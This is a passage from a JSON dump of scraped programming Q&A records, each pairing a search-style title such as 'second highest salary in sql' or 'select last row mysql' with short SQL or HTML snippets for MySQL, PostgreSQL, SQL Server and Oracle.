    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3535,
    "keyword": null,
    "link": null,
    "title": " search bar",
    "description": "CREATE DATABASE databasename;\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3536,
    "keyword": null,
    "link": null,
    "title": " search column by name mysql",
    "description": "select table_name, column_name  from information_schema.columns  where column_name like '%search_keyword%'; -- change search_keyword accordingly \n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3537,
    "keyword": null,
    "link": null,
    "title": " search db for table name",
    "description": "SELECT *  FROM INFORMATION_SCHEMA.TABLES  WHERE TABLE_NAME LIKE '%whatever%'\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3538,
    "keyword": null,
    "link": null,
    "title": " search for column name in psql",
    "description": "select t.table_schema,        t.table_name from information_schema.tables t inner join information_schema.columns c on c.table_name = t.table_name                                  and c.table_schema = t.table_schema where c.column_name = 'last_name'       and t.table_schema not in ('information_schema', 'pg_catalog')       and t.table_type = 'BASE TABLE' order by t.table_schema;\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3539,
    "keyword": null,
    "link": null,
    "title": " search for column name in sql db when i don't know which table it is in",
    "description": "SELECT      COLUMN_NAME AS 'ColumnName'             ,TABLE_NAME AS  'TableName' FROM        INFORMATION_SCHEMA.COLUMNS WHERE       COLUMN_NAME LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\nSELECT      c.name  AS 'ColumnName'             ,t.name AS 'TableName' FROM        sys.columns c JOIN        sys.tables  t   ON c.object_id = t.object_id WHERE       c.name LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\nSelect * from  INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME LIKE '%MyName%'\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3540,
    "keyword": null,
    "link": null,
    "title": " search for partial string in sql",
    "description": "Where FirstName LIKE '%R%'\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3541,
    "keyword": null,
    "link": null,
    "title": " search for replace in mysql",
    "description": "UPDATE products SET  productDescription = REPLACE(productDescription,'abuot','about');\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3542,
    "keyword": null,
    "link": null,
    "title": " search for tables with name postgresql",
    "description": "select table_schema,        table_name from information_schema.tables where table_name like 'payment%'       and table_schema not in ('information_schema', 'pg_catalog')       and table_type = 'BASE TABLE' order by table_name,          table_schema; Code has been copied\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3543,
    "keyword": null,
    "link": null,
    "title": " search for value in all tables sql",
    "description": "DECLARE @SearchStr nvarchar(100) SET @SearchStr = '## YOUR STRING HERE ##'     -- Copyright &copy; 2002 Narayana Vyas Kondreddi. All rights reserved. -- Purpose: To search all columns of all tables for a given search string -- Written by: Narayana Vyas Kondreddi -- Site: http://vyaskn.tripod.com -- Updated and tested by Tim Gaunt -- http://www.thesitedoctor.co.uk -- http://blogs.thesitedoctor.co.uk/tim/2010/02/19/Search+Every+Table+And+Field+In+A+SQL+Server+Database+Updated.aspx -- Tested on: SQL Server 7.0, SQL Server 2000, SQL Server 2005 and SQL Server 2010 -- Date modified: 03rd March 2011 19:00 GMT CREATE TABLE #Results (ColumnName nvarchar(370), ColumnValue nvarchar(3630))   SET NOCOUNT ON   DECLARE @TableName nvarchar(256), @ColumnName nvarchar(128), @SearchStr2 nvarchar(110) SET  @TableName = '' SET @SearchStr2 = QUOTENAME('%' + @SearchStr + '%','''')   WHILE @TableName IS NOT NULL   BEGIN     SET @ColumnName = ''     SET @TableName =      (         SELECT MIN(QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME))         FROM     INFORMATION_SCHEMA.TABLES         WHERE         TABLE_TYPE = 'BASE TABLE'             AND    QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME) > @TableName             AND    OBJECTPROPERTY(                     OBJECT_ID(                         QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME)                          ), 'IsMSShipped'                            ) = 0     )       WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL)               BEGIN         SET @ColumnName =         (             SELECT MIN(QUOTENAME(COLUMN_NAME))             FROM     INFORMATION_SCHEMA.COLUMNS             WHERE         TABLE_SCHEMA    = PARSENAME(@TableName, 2)                 AND    TABLE_NAME    = PARSENAME(@TableName, 1)                 AND    DATA_TYPE IN ('char', 'varchar', 'nchar', 'nvarchar', 'int', 'decimal')                 AND    QUOTENAME(COLUMN_NAME) > @ColumnName         )           IF @ColumnName IS NOT NULL                   BEGIN             INSERT INTO #Results             EXEC             (                 'SELECT ''' + @TableName + '.' + @ColumnName + ''', LEFT(' + @ColumnName + ', 3630) FROM ' + @TableName + ' (NOLOCK) ' +                 ' WHERE ' + @ColumnName + ' LIKE ' + @SearchStr2             )         END     END    END   SELECT ColumnName, ColumnValue FROM #Results   DROP TABLE #Results\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3544,
    "keyword": null,
    "link": null,
    "title": " search mysql database for column",
    "description": "SELECT table_name, column_name from information_schema.columns WHERE column_name LIKE '%column_name_to_search%';\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3545,
    "keyword": null,
    "link": null,
    "title": " search query in mysql",
    "description": "SELECT * FROM `articles` where (description LIKE '%how to make%')\nSELECT * FROM table_name WHERE MATCH(col1, col2) AGAINST('search terms' IN NATURAL LANGUAGE MODE)  \nmysql> CREATE TABLE tutorial ( id INT UNSIGNED AUTO_INCREMENT NOT NULL PRIMARY KEY,  title VARCHAR(200),  description TEXT,  FULLTEXT(title,description) ) ENGINE=InnoDB; Query OK, 0 rows affected (2.40 sec)\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3546,
    "keyword": null,
    "link": null,
    "title": " search stored procedures",
    "description": "SELECT DISTINCT        o.name AS Object_Name,        o.type_desc   FROM sys.sql_modules m        INNER JOIN        sys.objects o          ON m.object_id = o.object_id  WHERE m.definition Like '%[ABD]%';\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3547,
    "keyword": null,
    "link": null,
    "title": " search stored procedures by name",
    "description": "select *  from     sys.procedures  where     name like '%name_of_proc%' \nSELECT DISTINCT        o.name AS Object_Name,        o.type_desc   FROM sys.sql_modules m        INNER JOIN        sys.objects o          ON m.object_id = o.object_id  WHERE m.definition Like '%[ABD]%';\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3548,
    "keyword": null,
    "link": null,
    "title": " search text in all sql server stored procedure",
    "description": "SELECT OBJECT_NAME(object_id)     FROM sys.sql_modules     WHERE OBJECTPROPERTY(object_id, 'IsProcedure') = 1     AND definition LIKE '%Foo%'\nSELECT DISTINCT        o.name AS Object_Name,        o.type_desc   FROM sys.sql_modules m        INNER JOIN        sys.objects o          ON m.object_id = o.object_id  WHERE m.definition Like '%[ABD]%';\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3549,
    "keyword": null,
    "link": null,
    "title": " second height salary mysql",
    "description": "Both options you find max as a subset and then exclude from main select sql> SELECT MAX( col ) FROM table  \tWHERE col < ( SELECT MAX( col ) FROM table); sql> SELECT MAX(col) FROM table  WHERE col NOT IN (SELECT MAX(col) FROM table);\n",
    "reg_date": "2021-10-12T09:59:36.000Z"
  },
  {
    "id": 3550,
    "keyword": null,
    "link": null,
    "title": " second highest salary in sql",
    "description": "Both options you find max as a subset and then exclude from main select sql> SELECT MAX( col ) FROM table  \tWHERE col < ( SELECT MAX( col ) FROM table); sql> SELECT MAX(col) FROM table  WHERE col NOT IN (SELECT MAX(col) FROM table);\nSELECT TOP 1 salary FROM ( SELECT DISTINCT TOP N salary FROM #Employee ORDER BY salary DESC ) AS temp ORDER BY salary\nHere is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \nSELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);\nSELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);   OR  Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \n/* sql 2nd highest salary employee */ select sal, ename from emp where sal =     (         select max(sal) from emp where sal <             (select max(sal) from emp)     ) ----------------------------------------------- option 2 select * from  (     select ename, sal, dense_rank() over(order by sal desc) rank     from emp ) where rank =2;\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3551,
    "keyword": null,
    "link": null,
    "title": " second last highest id in sql",
    "description": "SELECT * FROM `salary` ORDER BY id DESC LIMIT 1,1;\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3552,
    "keyword": null,
    "link": null,
    "title": " second max salary in sql",
    "description": "Both options you find max as a subset and then exclude from main select sql> SELECT MAX( col ) FROM table  \tWHERE col < ( SELECT MAX( col ) FROM table); sql> SELECT MAX(col) FROM table  WHERE col NOT IN (SELECT MAX(col) FROM table);\nSELECT MAX(salary), MIN(salary) FROM employees;\nSELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);\nSELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);   OR  Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \n/* sql 2nd highest salary employee */ select sal, ename from emp where sal =     (         select max(sal) from emp where sal <             (select max(sal) from emp)     ) ----------------------------------------------- option 2 select * from  (     select ename, sal, dense_rank() over(order by sal desc) rank     from emp ) where rank =2;\nSELECT MAX(SALARY) FROM EMPLOYEES UNION SELECT MIN(SALARY) FROM EMPLOYEES;\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3553,
    "keyword": null,
    "link": null,
    "title": " secondary index in cockroachDB",
    "description": "#This helps you understand Secondary index concept   $ cat index_demo.sql DROP TABLE IF EXISTS users; CREATE TABLE users (id INT PRIMARY KEY,                     last_name STRING NOT NULL,                     first_name STRING NOT NULL,                     country STRING,                     city STRING); INSERT INTO users (id, last_name, first_name, country, city)      VALUES (1, 'Cross', 'William', 'USA', 'Jersey City'),             (2, 'Seldess', 'Jesse', 'USA', 'New York'),             (3, 'Hirata', 'Lauren', 'USA', 'New York'),             (4, 'Cross', 'Zachary', 'USA', 'Seattle'),             (5, 'Shakespeare', 'William', 'UK', 'Stratford-upon-Avon'); $ clear $ cockroach sql --insecure < index_demo.sql   SELECT * FROM users; SHOW INDEXES FROM users; SELECT * FROM users WHERE id = 1; EXPLAIN SELECT * FROM users WHERE id = 1; EXPLAIN SELECT * FROM users WHERE last_name = 'Cross' AND first_name = 'William'; CREATE INDEX my_index ON users (last_name, first_name); SHOW INDEXES FROM users; EXPLAIN SELECT * FROM users WHERE last_name = 'Cross' AND first_name = 'William';\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3554,
    "keyword": null,
    "link": null,
    "title": " see all users mysql",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\nmysql> select host, user, password from mysql.user; \nmysql> select * from mysql.user; \n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3555,
    "keyword": null,
    "link": null,
    "title": " see mysql users ubuntu",
    "description": "SELECT User FROM mysql.user;\nSELECT User, Host FROM mysql.user;\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3556,
    "keyword": null,
    "link": null,
    "title": " see the structure of a table mysql",
    "description": "DESCRIBE table;\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3557,
    "keyword": null,
    "link": null,
    "title": " select",
    "description": "<select>   <option value=\"actual value 1\">Display Text 1</option>   <option value=\"actual value 2\">Display Text 2</option>   <option value=\"actual value 3\">Display Text 3</option> </select>\n<label for=\"cars\">Choose a car:</label>  <select id=\"cars\">   <option value=\"volvo\">Volvo</option>   <option value=\"saab\">Saab</option>   <option value=\"mercedes\">Mercedes</option>   <option value=\"audi\">Audi</option> </select>\n<select class=\"form-select\">     <option selected>Open this select menu</option>     <option value=\"1\">One</option>     <option value=\"2\">Two</option>     <option value=\"3\">Three</option> </select>                       \nselect [all/distinct] <COL1>, <COL2>, <COL3> from <TABLE_NAME> [join <JOIN_CONDITION>] [where <CONDITION>] [group by <COLUMN_NAME>] [having <SEARCH_CONDITION>] [order by <SORT_SPECIFICATION>]   /* Specifically for SQL -> Oracle  LEGEND:  [...]   :   optional entries <...>   :   your specific entry */\nSELECT * FROM table WHERE condition GROUP BY expression HAVING condition { UNION | INTERSECT | EXCEPT } ORDER BY expression LIMIT count OFFSET start\nSELECT * FROM TABLE_NAME;\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3558,
    "keyword": null,
    "link": null,
    "title": " select * from table where name like",
    "description": "SELECT * FROM table_name WHERE column_name LIKE '%or%';\n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3559,
    "keyword": null,
    "link": null,
    "title": " select * where id = 1,2,3",
    "description": "SELECT * FROM Table WHERE id IN (1,2,3,4,5) AND ColB = (SELECT ColB FROM Table WHERE id IN (1,2,3,4,5) ORDER BY FIELD(id,1,2,3,4,5) LIMIT 1) \n",
    "reg_date": "2021-10-12T09:59:37.000Z"
  },
  {
    "id": 3560,
    "keyword": null,
    "link": null,
    "title": " select 2 rows in sql",
    "description": "SELECT * FROM `table` WHERE id IN (1,2,3,...,n)\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3561,
    "keyword": null,
    "link": null,
    "title": " select  STR TO DATE(date seance1,'DD-MM-YYYY')",
    "description": "ORDER BY STR_TO_DATE(datestring, '%d/%m/%Y')\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3562,
    "keyword": null,
    "link": null,
    "title": " select a certain number of entries from select mysql",
    "description": " SELECT * FROM `your_table` LIMIT 0, 5000  \n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3563,
    "keyword": null,
    "link": null,
    "title": " select all columns except one sql",
    "description": "/* Get the data into a temp table */ SELECT * INTO #TempTable FROM YourTable /* Drop the columns that are not needed */ ALTER TABLE #TempTable DROP COLUMN ColumnToDrop /* Get results and drop temp table */ SELECT * FROM #TempTable DROP TABLE #TempTable\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3564,
    "keyword": null,
    "link": null,
    "title": " select all same column value in sql",
    "description": "SELECT RollId, count(*) AS c FROM `tblstudents` GROUP BY RollId HAVING c > 1 ORDER BY c DESC\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3565,
    "keyword": null,
    "link": null,
    "title": " select all source oracle",
    "description": "select * from   all_source where  lower(text) like lower('%Some source%');\nSELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3566,
    "keyword": null,
    "link": null,
    "title": " select all tables sql",
    "description": "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nSELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'\nBY LOVE SINGH on May 19 2020  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nSELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' \n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3567,
    "keyword": null,
    "link": null,
    "title": " select amount weeks between two dates mysql",
    "description": "##syntax: FLOOR(DATEDIFF(DATE(column_end_date), DATE(column_ini_date))/7)  Select FLOOR(DATEDIFF(DATE(20090215), DATE(20090101))/7);\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3568,
    "keyword": null,
    "link": null,
    "title": " select count concat string sql server",
    "description": "'Express 24: ' + CAST(     (     SELECT  COUNT(Product)      FROM    [DHL].[dbo].[F_SubBetsy](@startdate, @enddate,                                      'EXPRESS EXPRESS 24', @contract, @account)      ) as varchar(16)) + '\\r\\nExpress 48: ' + (SEL...\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3569,
    "keyword": null,
    "link": null,
    "title": " select count distinct multiple columns sql server",
    "description": "SELECT COUNT(DISTINCT (CHECKSUM(DocumentId,DocumentSessionId)) + CHECKSUM(REVERSE(DocumentId),REVERSE(DocumentSessionId)) ) FROM DocumentOutPutItems\n",
    "reg_date": "2021-10-12T09:59:38.000Z"
  },
  {
    "id": 3570,
    "keyword": null,
    "link": null,
    "title": " select count from table mysql",
    "description": "SELECT COUNT(*) FROM count_demos;\n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3571,
    "keyword": null,
    "link": null,
    "title": " select count of distinct values sql",
    "description": "SELECT COUNT (DISTINCT column-name)  FROM table-name\n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3572,
    "keyword": null,
    "link": null,
    "title": " select current timestamp - interval '3 days';",
    "description": "--yesterday SELECT NOW() - INTERVAL '1 DAY';  --Unrelated to the question, but PostgreSQL also supports some shortcuts: SELECT 'yesterday'::TIMESTAMP, 'tomorrow'::TIMESTAMP, 'allballs'::TIME;\nSELECT current_timestamp - interval \"3 days\"; -- 2020-06-24 08:25:31.759993 America/Los_Angeles \n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3573,
    "keyword": null,
    "link": null,
    "title": " select database in sql",
    "description": "USE DatabaseName; \n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3574,
    "keyword": null,
    "link": null,
    "title": " select dba users oracle",
    "description": "SELECT * FROM dba_users; \n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3575,
    "keyword": null,
    "link": null,
    "title": " select distinct",
    "description": "SELECT DISTINCT ma_colonne FROM nom_du_tableau\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nDistinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT Column_name FROM table_name;\nThe SELECT DISTINCT statement is used to return only distinct (different) values. Ex: select DISTINCT Country from TableName;\n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3576,
    "keyword": null,
    "link": null,
    "title": " select duplicates in sql",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\n/* Gets reps */ SELECT fieldA, COUNT(*) FROM tableA GROUP BY fieldA HAVING COUNT(*) > 1  /* Use reps to filter results */ SELECT a.* FROM tableA a JOIN ( \tSELECT fieldA, COUNT(*) as 'count' \tFROM tableA \tGROUP BY fieldA \tHAVING COUNT(*) > 1 ) b ON a.fieldA = b.fieldA \n&bull; SELECT first_name, COUNT (first_name) FROM employees GROUP BY first_name HAVING (COUNT(first_name) > 1);\n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3577,
    "keyword": null,
    "link": null,
    "title": " select first and last row mysql",
    "description": "SELECT   (SELECT * FROM tableName ORDER BY col1 LIMIT 1)        AS first,   (SELECT * FROM tableName ORDER BY col1 DESC LIMIT 1)   AS last ;\n(select *from DemoTable694 order by EmployeeId ASC LIMIT 1) UNION (select *from DemoTable694 order by EmployeeId DESC LIMIT 1);\n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3578,
    "keyword": null,
    "link": null,
    "title": " select first and last row sql",
    "description": "SELECT   (SELECT * FROM tableName ORDER BY col1 LIMIT 1)        AS first,   (SELECT * FROM tableName ORDER BY col1 DESC LIMIT 1)   AS last ;\n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3579,
    "keyword": null,
    "link": null,
    "title": " select first character of string mySql",
    "description": "mysql> SELECT pub_name, LEFT(pub_name, 5)      -> FROM publisher; +------------------------------+-------------------+ | pub_name                     | LEFT(pub_name, 5) | +------------------------------+-------------------+ | Jex Max Publication          | Jex M             |  | BPP Publication              | BPP P             |  | New Harrold Publication      | New H             |  | Ultra Press Inc.             | Ultra             |  | Mountain Publication         | Mount             |  | Summer Night Publication     | Summe             |  | Pieterson Grp. of Publishers | Piete             |  | Novel Publisher Ltd.         | Novel             |  +------------------------------+-------------------+ 8 rows in set (0.00 sec) \n",
    "reg_date": "2021-10-12T09:59:39.000Z"
  },
  {
    "id": 3580,
    "keyword": null,
    "link": null,
    "title": " select first rows postgresql",
    "description": "SELECT * FROM biggest_companies FETCH FIRST 10 ROW ONLY;\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3581,
    "keyword": null,
    "link": null,
    "title": " select from array in psql",
    "description": "-- In case you want to run select query on your custom array  select * from unnest(ARRAY[1,2,3]);\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3582,
    "keyword": null,
    "link": null,
    "title": " select from column mysql",
    "description": "/* * Ex:- Selecting name from customer table */  SELECT name FROM customer;  /* * Ex:- Selecting customer i.d and name from customer table */  SELECT id, name FROM customer;\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3583,
    "keyword": null,
    "link": null,
    "title": " select from describe sql",
    "description": "",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3584,
    "keyword": null,
    "link": null,
    "title": " select from one table where not on the other",
    "description": "SELECT id FROM a.table WHERE id NOT IN (SELECT b.id FROM b.id) \n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3585,
    "keyword": null,
    "link": null,
    "title": " select if then postgresql",
    "description": "SELECT field1, field2,   CASE     WHEN field1>0 THEN field2/field1     ELSE 0   END    AS field3 FROM test\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3586,
    "keyword": null,
    "link": null,
    "title": " select insert new table sql server",
    "description": "SELECT * INTO [new_BK] FROM [old_table] \n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3587,
    "keyword": null,
    "link": null,
    "title": " select inside insert query",
    "description": "INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;  #INSERT INTO table2 (column1, column2, column3, ...) #SELECT column1, column2, column3, ... #FROM table1 #WHERE condition;\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3588,
    "keyword": null,
    "link": null,
    "title": " select into table variable",
    "description": "DECLARE @userData TABLE(     name varchar(30) NOT NULL,     oldlocation varchar(30) NOT NULL );  INSERT INTO @userData (name, oldlocation) SELECT name, location FROM myTable INNER JOIN otherTable ON ... WHERE age > 30;\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3589,
    "keyword": null,
    "link": null,
    "title": " select into temp table",
    "description": "SELECT t.col1, t.col2... INTO #temp FROM table1 AS t\nSELECT *  INTO #temp FROM (     SELECT col1, col2     FROM table1 ) AS x\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3590,
    "keyword": null,
    "link": null,
    "title": " select last 2 characters sql",
    "description": "SELECT RIGHT(Column, number you want) FROM yourtable\n",
    "reg_date": "2021-10-12T09:59:40.000Z"
  },
  {
    "id": 3591,
    "keyword": null,
    "link": null,
    "title": " select last row in sql",
    "description": "mysql> select *from getLastRecord ORDER BY id DESC LIMIT 1;\nSELECT TOP 1 * FROM Table ORDER BY ID DESC \nSELECT * FROM TableName WHERE id=(SELECT max(id) FROM TableName); \nSELECT * FROM TableName WHERE id=(SELECT max(id) FROM TableName);\nSELECT   (SELECT * FROM tableName ORDER BY col1 LIMIT 1)        AS first,   (SELECT * FROM tableName ORDER BY col1 DESC LIMIT 1)   AS last ;\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3592,
    "keyword": null,
    "link": null,
    "title": " select last row mysql",
    "description": "SELECT fields FROM table ORDER BY id DESC LIMIT 1;\nSELECT   (SELECT * FROM tableName ORDER BY col1 LIMIT 1)        AS first,   (SELECT * FROM tableName ORDER BY col1 DESC LIMIT 1)   AS last ;\nSELECT * FROM tableName ORDER BY col1 DESC LIMIT 10;\nSELECT lastName,firstName FROM Customer        WHERE lastName LIKE \"B%\"          AND city = \"Indianapolis\"          AND (phone LIKE \"%8%\" OR fax LIKE \"%8%\")\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3593,
    "keyword": null,
    "link": null,
    "title": " select list is not in group by clause",
    "description": "SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); \nmysql> set global sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';  mysql> set session sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3594,
    "keyword": null,
    "link": null,
    "title": " select milliseconds mysql",
    "description": "SELECT UNIX_TIMESTAMP();\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3595,
    "keyword": null,
    "link": null,
    "title": " select mysql",
    "description": "$sql = \"SELECT id, firstname, lastname FROM MyGuests\"; $result = $conn->query($sql);  if ($result->num_rows > 0) {     // output data of each row     while($row = $result->fetch_assoc()) {         echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"firstname\"]. \" \" . $row[\"lastname\"]. \"<br>\";     } } else {     echo \"0 results\"; } $conn->close();\nSELECT * FROM `table_name`; SELECT `col1`,`col2` FROM `table_name`; SELECT `col1 as name`,`col2 as email` FROM `table_name`; SELECT * FROM `table_name` WHERE id = '1';\nSELECT column_name(s) FROM table_name\nSELECT    `nachname` , `vorname`  FROM testadressen WHERE vorname = 'Fischer' \nSELECT select_list FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3596,
    "keyword": null,
    "link": null,
    "title": " select new table sql",
    "description": "SELECT * INTO newtable [IN externaldb] FROM oldtable WHERE condition;\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3597,
    "keyword": null,
    "link": null,
    "title": " select nextval from sequence oracle",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';  ALTER SEQUENCE seq_name INCREMENT BY 100;\t-- Value to reach desired value - 1 SELECT seq_name.nextval FROM dual;\t\t\t-- Reinitialize value to desired ALTER SEQUENCE seq_name INCREMENT BY 1;\t\t-- Back to init step\nSELECT schema.seq_name.NEXTVAL FROM dual;  INSERT INTO table_name (VALUE1) VALUES ( \tschema.seq_name.NEXTVAL AS VALUE1 );\n select sec_codigolibros.nextval from dual; \n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3598,
    "keyword": null,
    "link": null,
    "title": " select nextval from sequence sql",
    "description": "SELECT schema.seq_name.NEXTVAL FROM dual;  INSERT INTO table_name (VALUE1) VALUES ( \tschema.seq_name.NEXTVAL AS VALUE1 );\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3599,
    "keyword": null,
    "link": null,
    "title": " select nls date format",
    "description": "-- Date format for session ALTER SESSION SET NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:59:41.000Z"
  },
  {
    "id": 3600,
    "keyword": null,
    "link": null,
    "title": " select odd records sql",
    "description": "SELECT t.First, t.Last FROM (     SELECT *, Row_Number() OVER(ORDER BY First, Last) AS RowNumber              --Row_Number() starts with 1     FROM Table1 ) t WHERE t.RowNumber % 2 = 0 --Even --WHERE t.RowNumber % 2 = 1 --Odd \n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3601,
    "keyword": null,
    "link": null,
    "title": " select only one row sql",
    "description": "select * from your_table where rownum = 1;\n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3602,
    "keyword": null,
    "link": null,
    "title": " select password from user mysql",
    "description": "",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3603,
    "keyword": null,
    "link": null,
